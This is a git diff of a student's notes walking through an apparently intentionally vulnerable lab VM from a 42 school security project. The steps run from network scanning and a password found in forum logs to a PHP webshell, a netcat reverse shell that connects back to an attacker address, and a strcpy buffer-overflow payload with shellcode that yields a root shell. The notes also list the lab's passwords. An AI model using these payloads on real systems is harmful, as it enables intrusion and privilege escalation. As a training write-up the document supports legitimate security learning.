@@ -1,25 +1,26 @@
-installer kalilinux
-sudo apt-get install gobuster
+install kalilinux
 
-scanner le réseau avec nmap
-cmd : nmap -sP 192.168.0-255.0/24
+basic user: root
+pwd: toor
 
-get the ip of the virtual machine
+do ifconfig on kali to get the ip of the machine (Kali's ip)
 
-nmap the ip of the machine (there are on ports) port 80 et 443 open -> web server
-cmd : nmap --top-ports 1000 -T4 -sC http://example.com
-	OR
-open armitage and scan within the range of the virtual machine
+scan network with nmap on armitage
+cmd : 192.168.99.0-255/24
+
+get the ip of the virtual machine who is on linux
+
+port 80 and 443 are opened, http and https
 
 Go to the ip of the virtual machine on internet or curl it. There is a page.
 
 nikto -h + adress ou dirb sur l'ip de la machine en http et https
 cmd: nikto -h https://ip_machine
-OR
-cmd: dirb https://ip_machine
 
 phpmyadmin + forum + mail
 
+On forum, log connection (probleme login?)
+We search password and there is something strange on the 11th
 User login try !q\]Ej?*5K5cy*AJ in forum 6
 (maybe password misstype?)
 And right after that lmezard logged in, maybe it was a mistake from his part ..
@@ -27,8 +28,8 @@ And right after that lmezard logged in, maybe it was a mistake from his part ..
 user: lmezard
 pwd: !q\]Ej?*5K5cy*AJ
 
-Try to send mail to admin when you're logged in
-your mail is : laurie@borntosec.net
+We are logged in on forum
+We click on our name, your mail is : laurie@borntosec.net
 
 We still have the webmail we didn't use, we try to logged on it with the mail adress and
 the same pwd we still have.
@@ -41,7 +42,7 @@ pwd: Fg-'kKXBj87E:aJ$
 
 If we go here ip_machine/icons/README, we see that the server is running on apache, by default the directory is /var/www
 
-We need this command
+We select forum_db and we need this command
 INSERT INTO `mlf2_entries_cache`(`cache_id`, `cache_text`) VALUES (12,LOAD_FILE("/var/www/forum/index.php"))
 
 We have the right to write in compile dir
@@ -56,6 +57,7 @@ reverse shell on that website without -e
 https://www.nicolashug.com/pentest-et-securite/netcat-reverse-shell-e
 launch on kali : nc -nvlp 1234
 cmd in the php exploit : mknod /tmp/backpipe p; /bin/sh 0</tmp/backpipe | nc MY_IP 1234 1>/tmp/backpipe
+https://192.168.99.100/forum/templates_c/test.php?cmd=mknod /tmp/backpipe p; /bin/sh 0</tmp/backpipe | nc MY_IP 1234 1>/tmp/backpipe
 
 directory /home/LOOKATME
 cd /home/LOOKATME; cat password
@@ -64,12 +66,11 @@ user: lmezard
 pwd: G!@M6f4Eatau{sF"
 
 got a file called fun
-need to parse it
-I try to send it into a html in the dir i have the right and parse it.. But i was wrong
-The file is actually a .tar
-So i open a ssh port on the kali machine and connect it via lmezard account to copy it with scp and then untar it (tar -xzf fun)
-We have the position of each file with //fileXX
-I unrar it but there is still parsing to do. I have to get a "\n" at the end of each to escape the //file of the previous file so that the next line isn't escape. It works !
+The file is actually an archive
+So we copy it via ssh from the vm in kali
+	scp fun root@192.168.99.101:~/
+
+We use the php script to parse it
 I have a message who tell me to ssh a pass.. let's do it
 
 The result is used to login with user laurie in ssh
@@ -79,7 +80,7 @@ pwd: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
 We see the bomb with a file readme
 Bomb is compiled, we use hexray (ida64)
 
-gdb --args ./bomb l To launch with arguments if needed
+gdb --args ./bomb YourArgs To launch with arguments if needed
 
 PHASE_1
 
@@ -135,10 +136,10 @@ PHASE_4
 
 PHASE_5
 
-	We have to put a string of lenght 6 which is changed in a while, it is passed in a strings_not_equal function, break in that function and we check our modified string at :
+	We have to put a string of lenght 6 which is changed in a while, it is passed in a strings_not_equal(b *0x08048d7b) function, break in that function and we check our modified string at :
 		x/s *0xBFFFF6E0
 	theirs are :
-		x/s *0xBFFFF6E4
+		IDA phase 5 OR x/s *0xBFFFF6E4
 	We brute force it by testing all characters like "abcdef" "ghijkl" etc..
 	and we see how it is modified and note it like : 'o' is changed to 'g', 'p' is changed to 'i' etc..
 	the result is opekmq
@@ -147,3 +148,48 @@ PHASE_6
 
 We have 6 numbers, a first while check if they are <= 6 and no two times the same.
 There is operation after and we have to figure out the same, so we brute force it with a php script
+
+The 6 numbers are : 
+4 2 6 3 1 5
+
+SECRET_PHASE
+
+There is a secret phase, we can solve it but it doesn't give anything. (cf : phase_defused to access secret phase)
+
+As said on the forum of 42 https://forum.intra.42.fr/topics/17158/messages/1#81289 there is an error and we have to swictch number of the last script :
+Publicspeakingisveryeasy.126241207201b2149opekmq426135
+
+THOR_MACHINE
+
+We have two file, on who said it's zaz password and another who is turtle (We need to draw something)
+We get on this site and see we can use it http://www.logointerpreter.com/turtle-editor.php#
+We create a turtle.php that we use to change the turtle file into something we can use for the interpreter
+It draw SLASH and say if we can digest it.
+Hash algorithm have to digest file or message.
+We use md5 on SLASH and use it as password for zaz in ssh.
+pwd : 646da671ca01bb5d84dbb5fb2238dc8e
+
+ZAZ MACHINE
+
+	Two files : exploit_me and README
+
+	We see that the executable exploit_me take a param. If we try with too much character, it segfault.
+	After disas the main with gdb, we see it use strcpy and after some search, we see that we can exploit it to
+	have a new shell with the right of the program, who is root.
+
+	We have an example of buffer_overflow
+		https://pointerless.wordpress.com/2012/02/26/strcpy-security-exploit-how-to-easily-buffer-overflow/
+
+	The payload we use come from this adress
+		https://beta.hackndo.com/buffer-overflow/
+
+	Here is the command to print the string and the stack, we want to change the last.
+	After some search with this command
+		x/40xw $esp
+	The good number is 95
+
+	We charge the payload with perl, because we can't print non writable character with the keyboard. Duuuuhhh
+
+	./exploit_me `perl -e 'print "\x90"x95 . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff" . "/bin/sh" . "\x40\xf6\xff\xbf"'`
+
+	Tada : new brand shell with root
